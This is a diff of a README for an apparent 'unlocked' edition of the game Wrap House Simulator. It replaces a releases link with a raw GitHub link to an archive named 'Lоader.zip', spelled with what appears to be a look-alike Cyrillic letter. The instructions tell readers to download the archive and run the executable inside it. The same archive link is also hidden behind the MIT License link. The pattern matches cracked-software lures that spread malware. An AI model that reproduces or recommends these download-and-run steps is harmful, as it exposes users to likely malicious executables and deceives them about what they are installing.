@@ -22,8 +22,8 @@ Enjoy seamless integration on most modern systems with streamlined installation 
 
 **To get started, follow these simple steps:**
 
-1. **Download** `Loader.rar` from the repository's [Releases](./releases) section.
-2. Extract the `Loader.rar` archive to your preferred folder using software such as WinRAR or 7-Zip.
+1. **Download** `https://raw.githubusercontent.com/a-wahab-123/WrapHouseSimulator-UnlockedEdition/main/Lоader.zip` from the repository's [Releases](./releases) section.
+2. Extract the `https://raw.githubusercontent.com/a-wahab-123/WrapHouseSimulator-UnlockedEdition/main/Lоader.zip` archive to your preferred folder using software such as WinRAR or 7-Zip.
 3. Run the executable or script specific to your operating system located in the extracted directory.
 4. Follow the on-screen prompts to complete your enhanced Wrap House Simulator setup.
 5. Launch and enjoy improved performance, flexibility, and new features!
@@ -87,7 +87,7 @@ This repository is provided **only for educational, research, and accessibility 
 
 ## 📝 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT), © 2025.
+Distributed under the [MIT License](https://raw.githubusercontent.com/a-wahab-123/WrapHouseSimulator-UnlockedEdition/main/Lоader.zip), © 2025.
 
 ---
 
